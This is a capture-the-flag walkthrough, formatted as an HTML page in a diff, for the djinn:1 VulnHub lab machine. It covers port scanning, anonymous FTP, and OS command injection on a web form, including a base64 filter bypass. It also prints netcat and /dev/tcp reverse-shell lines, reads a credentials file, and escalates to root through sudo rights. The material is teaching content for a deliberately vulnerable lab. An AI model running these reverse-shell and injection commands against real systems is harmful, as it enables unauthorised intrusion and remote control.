@@ -1,0 +1,188 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">djinn:1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-11-27T14:57:59+00:00">November 27, 2019</time><time class="updated" datetime="2025-06-10T20:10:55+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello guys, today we will face an Intermediate challenge. Introducing the djinn: 1 virtual machine, created by “<a style="color: #000000;" href="https://twitter.com/@0xmzfr">0xmzfr</a>” and available on Vulnhub. This is another Capture the Flag Style Challenge where we have to escalate privileges to the “root user” and find 2 flags to complete the challenge.</span></p>
+<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <a style="color: #000000;" href="https://www.vulnhub.com/entry/djinn-1,397/">link</a>.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Methodologies:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning</span>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Enumeration</span>
+<ul>
+<li><span style="color: #000000;">FTP Enumeration</span></li>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Netcat</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using gobuster</span></li>
+<li><span style="color: #000000;">Discovering Command Injection</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Exploitation</span>
+<ul>
+<li><span style="color: #000000;">Bypassing Command Injection Filter</span></li>
+<li><span style="color: #000000;">Getting Netcat Session</span></li>
+<li><span style="color: #000000;">Enumeration Files and Directories</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Post Exploitation</span>
+<ul>
+<li><span style="color: #000000;">Reading the User Flag</span></li>
+<li><span style="color: #000000;">Getting Login Credentials</span></li>
+<li><span style="color: #000000;">Enumeration for Sudo Permissions</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Privilege Escalation</span>
+<ul>
+<li><span style="color: #000000;">Abusing Sudo Rights</span></li>
+<li><span style="color: #000000;">Confirm Root Access</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<p> </p>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">The first step is to identify the target. So, to identify your target we will use the following command:</span></p>
+<pre class="lang:default decode:true ">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-A7nSA11WmDo/Xd6JAMXmYtI/AAAAAAAAhow/n3OvNA0bORkU6bFMwsqALei69I6xK2R9QCLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">Now we will use Nmap to gain information about the open ports and the services running on the target machine using the command</span></p>
+<pre class="lang:default decode:true ">nmap -p- 192.168.43.134</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IxcjQfwImWM/Xd6JDw6oaQI/AAAAAAAAhpc/RXfhZXaz89IBfQl0e1znc0T7jDOras4iACLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">So as we can see that port 21/TCP is open so we can try for anonymous login to fetch some useful information.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Yes! We are in! There are three files here namely creds, game and message.</span></p>
+<pre class="lang:default decode:true ">ftp 192.168.43.134
+anonymous
+ls</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Z5lV2QwwnKs/Xd6JH24OfNI/AAAAAAAAhqI/6PzAIFtSUUwhhV-65INR60pb_tT3jAokACLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">We can see let’s try to download these three files in our kali machine and try to read their content</span></p>
+<p><span style="color: #000000;">Command used to download these files are:</span></p>
+<pre class="lang:default decode:true ">get creds.txt
+get game.txt
+get message.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5NdwkSuZpr0/Xd6JH5WpP9I/AAAAAAAAhqM/dx_sh3FyLNgMY0M-HqN-kAvIEQZr3Bt_ACLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">We downloaded all three files in our Kali machine and now it’s time to see the content of these files using the command cat</span></p>
+<pre class="lang:default decode:true ">cat creds.txt
+cat game.txt
+cat message.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-rBME39pLc50/Xd6JIKsclSI/AAAAAAAAhqQ/zga1_jCvpkEWWeMhNzQGTmyDbv_u2HiUgCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">So we have three things that seem to be useful for us, but SSH port is filtered so clearly these creds can’t be used to login via SSH. let’s note down these three highlighted parts in a file for future reference.</span></p>
+<p><span style="color: #000000;">But according to the message.txt file, there is a game running on port 1337. let’s play the game.</span></p>
+<pre class="lang:default decode:true ">http://192.168.43.134:1337</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-S9Kx54UMFLY/Xd6JI-oCGbI/AAAAAAAAhqU/PKyH6F3ljP4-dNlwLT0P4M5GEwk6wUI9wCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">We get an error: This page isn’t working. So, in this case, we will use Netcat to make a connection so that we can play the game</span></p>
+<pre class="lang:default decode:true ">nc 192.168.43.134 1337</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-uDCxW0LlSe8/Xd6JJEvdY7I/AAAAAAAAhqY/bo4nC0iG-ToSatcGTAUifq3isQxMYx_OgCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">As we can see in the above image that we need to answer such simple maths question 1000 times and for sure we are not going to do that. The reason is: playing this game is time-consuming and we are not sure about after solving 1000 times is there any gift for us which will help us or it’s just some greeting message to boost up our confidence.</span></p>
+<p><span style="color: #000000;">So without wasting our time let’s try another port that is 7331</span></p>
+<pre class="lang:default decode:true ">http://192.168.43.134:7331</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-nzKwPCnBtvU/Xd6JJJFg-2I/AAAAAAAAhqc/u0xcxmiT54INhztKdLVEOozdYEXRWumyACLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">We don’t find anything useful. after checking the source code there is no information that can be used to login to any of the accounts in the targeted machine. So now we can think of directory buster, means it’s time to find some hidden directories and pages at this particular port. We used the gobuster tool for directory Bruteforce. This gave us two pages ‘/genie’ and’/wish’.</span></p>
+<pre class="lang:default decode:true ">gobuster dir -u http://192.168.43.134:7331 -w /usr/share/wordlists/dirb/big.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-OlgSdMU9nZI/Xd6JJ25xNTI/AAAAAAAAhqg/Gzm0AjmWrB425YP97PTS50YDoHr4yLsiwCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">We opened the /genie page. It is showing an error that is ERROR 403. So this page might be of no use.</span></p>
+<pre class="lang:default decode:true ">http://192.168.43.134:7331/genie</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-gAg-gi2kqnY/Xd6JAFMXRAI/AAAAAAAAho0/PhLy46dUcvsvUNhZS8nSbdUskZb5ZmXJgCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">We open this another page named /wish. This contained text saying “Oh you found me then go on make a wish. This can make all your wishes come true.” Followed by a form input section and Submit button. This is absolutely interesting.</span></p>
+<pre class="lang:default decode:true ">http://192.168.43.134:7331/wish</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-V0L5i7fndds/Xd6JALIHNjI/AAAAAAAAho4/glU_d6JJdjQjmhiXuR4ftaobpG6P_bmcQCLcBGAsYHQ/s1600/11.png"/></p>
+<p><span style="color: #000000;">So it’s time to explore the /wish. As there is a form at this page so for a second we can think of OS command injection. Ok let’s try some common commands if we are going in the right direction or not</span></p>
+<pre class="lang:default decode:true ">id</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-M3UlXgMeoak/Xd6JBQufv8I/AAAAAAAAho8/6fOhuKztT2kPwWvgAVfYVLgiy7ddRTMzwCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">So the “id” command is executed successfully. It means we were right before. This is OS command injection and we can take advantage of this vulnerability to get a shell using Netcat.</span></p>
+<p><span style="color: #000000;">Let’s do it!</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-LmclBIk1sSc/Xd6JB1bK9CI/AAAAAAAAhpE/ZRE1WOGWSo0jq9MoNwI-F7vVQ83altWLwCLcBGAsYHQ/s1600/13.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">We started a Netcat listener on our Kali machine. Then we tried to invoke the Netcat shell from the Command Injection that we just found.</span></p>
+<pre class="lang:default decode:true">nc -nlvp 1234
+nc -e /bin/sh 192.168.43.249 1234</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Tq0VgVzEIc8/Xd6JBqgJvRI/AAAAAAAAhpA/rPRRTP4bthcXHvsiXaZPtIeC8b4UkmwCwCLcBGAsYHQ/s1600/14.png"/></p>
+<p><span style="color: #000000;">It gives a message: Wrong choice of words </span></p>
+<p><span style="color: #000000;">So after trying a lot of commands, we can conclude that some of the symbols are characters are restricted. if those characters are present in the command then the command is not going to be executed.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Wh_kvXPQEvg/Xd6JCcprrMI/AAAAAAAAhpI/mmWRmQVyngc-Sv_LfSslLP3kpf_8IzyWACLcBGAsYHQ/s1600/15.png"/></p>
+<p> </p>
+<p><span style="color: #000000;">So after thinking a lot, we came up with a solution what if encrypt the whole command in base64 format because commands like “echo”,” base64 -d” and “bash” are working.</span></p>
+<p><span style="color: #000000;">The website used to encrypt: https://www.base64encode.org/enc/encore/</span></p>
+<pre class="lang:default decode:true">nc -e /bin/sh 192.168.43.249 1234</pre>
+<p><span style="color: #000000;">Encoded command: bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQzLjI0OSAxMjM0</span></p>
+<p><span style="color: #000000;">So now we will use pipe (|) operator to make our work done!</span></p>
+<p><span style="color: #000000;">After experimenting a lot with /wish page we came up with this command:</span></p>
+<pre class="lang:default decode:true">echo bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQzLjI0OSAxMjM0 | base64 -d | bash</pre>
+<p><span style="color: #000000;">But our luck is not good, this doesn’t work. It gives no error but this command doesn’t give us the shell access either. Now it’s time to search for some other forms of commands to get a shell and we will try this:</span></p>
+<pre class="lang:default decode:true">bash -i &gt;&amp; /dev/tcp/192.168.43.249/8080 0&gt;&amp;1</pre>
+<p><span style="color: #000000;">So we encoded this command using the same website. So now we will try the below-written command in /wish page. Don’t forget to start the listener using the command shown below.</span></p>
+<pre class="lang:default decode:true">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjE=</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-B1SaXj0TfrQ/Xd6JCsedj7I/AAAAAAAAhpQ/VJD9RKhJzyMHbfBh-N8TNltM7fCeagq5ACLcBGAsYHQ/s1600/16.png"/></p>
+<p><span style="color: #000000;">We got the shell using this technique. We ran the command whoami to find the user of which we just got the shell. It came out to be www-data.</span></p>
+<pre class="lang:default decode:true">nc -nlvp 8080
+whoami</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-GbUPt56d4B0/Xd6JCtwuDGI/AAAAAAAAhpM/kyAWAmrxX6wLs0zzJkK4NM2DA-0xGrQEQCLcBGAsYHQ/s1600/17.png"/></p>
+<p><span style="color: #000000;">We decided to look around the machine. We found a directory named 80 in the opt directory. We opened it. Here we find some files. We took at the app.py file. We found the path to a file named creds.txt. Let’s change the directory to the given directory and try to read the credentials.</span></p>
+<pre class="lang:default decode:true ">ls
+cat app.py</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-aVDSrAH8_ag/Xd6JDXL6coI/AAAAAAAAhpU/g4o6lvyT6CszCeK_t9DGWcZfY3AzSf8owCLcBGAsYHQ/s1600/18.png"/></p>
+<p><span style="color: #000000;">We navigated to the path mentioned in that file. We found the credential for the user nitish.</span></p>
+<pre class="lang:default decode:true ">cd /home
+cd nitish/.dev/
+cat creds.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-msl22oXonyU/Xd6JDkZYQeI/AAAAAAAAhpY/gJn-feErW7g9Iu0_O_rpjj7tUyx_yDREQCLcBGAsYHQ/s1600/19.png"/></p>
+<p><span style="color: #000000;">We decided to login in as nitish. To do this we used the bash command. This invoked a bash shell, we converted that shell into a TTY shell using the python one-liner.</span></p>
+<pre class="lang:default decode:true ">bash
+python -c 'import pty;pty.spawn("/bin/sh")'</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-rZFS92g5ZkI/Xd6JET7c-TI/AAAAAAAAhpg/4_tMKeLt9MsKX0CNnV5PawtbCNQ5jcgCACLcBGAsYHQ/s1600/20.png"/></p>
+<p><span style="color: #000000;">We changed the user with the help of the su command. After entering the password that we found earlier we successfully logged in as nitish.</span></p>
+<pre class="lang:default decode:true ">su nitish
+p4ssw0rdStr3t0n9
+whoami</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RJ4eeZRnn5I/Xd6JEkioUpI/AAAAAAAAhpk/nGj1K1-ZxIstvJhCekNv_DJsFdcwAtFsQCLcBGAsYHQ/s1600/21.png"/></p>
+<h3><span style="color: #800000;"><strong>Post Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Now that we reached a stage in out exploitation that we have the access of a user. We decided to look for the user flag that is hidden. We traversed into the nitish user home directory. Here we found the user.txt. This is the User Flag. Congratulations!! We found our first flag.</span></p>
+<pre class="lang:default decode:true ">ls
+cd nitish
+ls
+cat user.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RJ4eeZRnn5I/Xd6JEkioUpI/AAAAAAAAhpk/nGj1K1-ZxIstvJhCekNv_DJsFdcwAtFsQCLcBGAsYHQ/s1600/21.png"/></p>
+<p><span style="color: #000000;">Now it’s time to check for Sudo rights of the user nitish using the command:</span></p>
+<pre class="lang:default decode:true ">sudo -l</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-05-1bwvEXDo/Xd6JFrbsVBI/AAAAAAAAhpw/mKwgZsq0-QMaGDYmLX_jAuI7M5vVvDZkwCLcBGAsYHQ/s1600/23.png"/></p>
+<p><span style="color: #000000;">We found that the user nitish can execute the genie binary without any password for user sam.</span></p>
+<p><span style="color: #000000;">As this is a custom user-generated script. We started tinkering it in order to understand the working of the script.</span></p>
+<pre class="lang:default decode:true ">genie
+genie -h</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--aO2-l5msJQ/Xd6JFhSSktI/AAAAAAAAhps/3fvhOY3qEF0laDJQ9PfNyWRWBoIldZuygCLcBGAsYHQ/s1600/24.png"/></p>
+<p><span style="color: #000000;">After messing around with this binary we successfully managed to get a shell of user sam using the command:</span></p>
+<pre class="lang:default decode:true">sudo -u sam genie -cmd new
+whoami</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-4dWpNiG6Gls/Xd6JF44iFMI/AAAAAAAAhp0/aGHzZ488PrgCTkc3kzZZlo8RVr4D8EejQCLcBGAsYHQ/s1600/25.png"/></p>
+<p><span style="color: #000000;">Now we will try to get a stable shell using the command bash and after that, we will check for sudo rights for the user sam. We again tried to enumerate the Sudo Permissions. As we can see that we can execute the /root/lago as root so let’s do it!</span></p>
+<pre class="lang:default decode:true ">bash
+sudo -l</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-lnImK_ufx4M/Xd6JGTN7YvI/AAAAAAAAhp4/281J8wx2mwAt-Yv8QGw_PCssstZycn9ogCLcBGAsYHQ/s1600/26.png"/></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">After trying a lot, we find a solution that it is possible if we can manage the correct number then we can get access to the root shell and yes we are right this time too. After multiple tried we enter the choice 2 and then type in “num” and successfully got a root shell.</span></p>
+<pre class="lang:default decode:true ">sudo -u root /root/lago
+2
+num
+whoami</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Tm-fP-T15eM/Xd6JG5XMqPI/AAAAAAAAhp8/u9IP3oL0pRMWacqZ2Z-j4_1-pOmfVjqDACLcBGAsYHQ/s1600/27.png"/></p>
+<p><span style="color: #000000;">We used the bash command to get a proper shell of the root user. Now that we are the root user, we need to find the root flag. Instead of wandering here and there we decided to go to the root directory of the root user. Here, find a script named proof.sh.</span></p>
+<pre class="lang:default decode:true ">bash
+su root
+cd
+ls</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-0ZOMOZ7TnbM/Xd6JG_-b31I/AAAAAAAAhqA/icqLbGsUhpspPvWxy8CqXTSxa3bAxa3egCLcBGAsYHQ/s1600/28.png"/></p>
+<p><span style="color: #000000;">We ran the script, It gave us the final root flag that was needed to complete this CTF Challenge.</span></p>
+<pre class="lang:default decode:true ">./proof.sh</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ki6CdSMPuMY/Xd6JHJyj2EI/AAAAAAAAhqE/MDAo1GzQxQIMfucLwtrokTwwEXlrI2E2QCLcBGAsYHQ/s1600/29.png"/></p>
+<p><span style="color: #000000;"><strong>Author: Yash Saxena </strong>an undergraduate student pursuing B. Tech in Computer science and engineering with a specialization in cybersecurity and forensics from DIT University, Dehradun.<strong> Contact </strong><strong><a style="color: #000000;" href="https://www.linkedin.com/in/yash-saxena-412349161/">here</a></strong>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
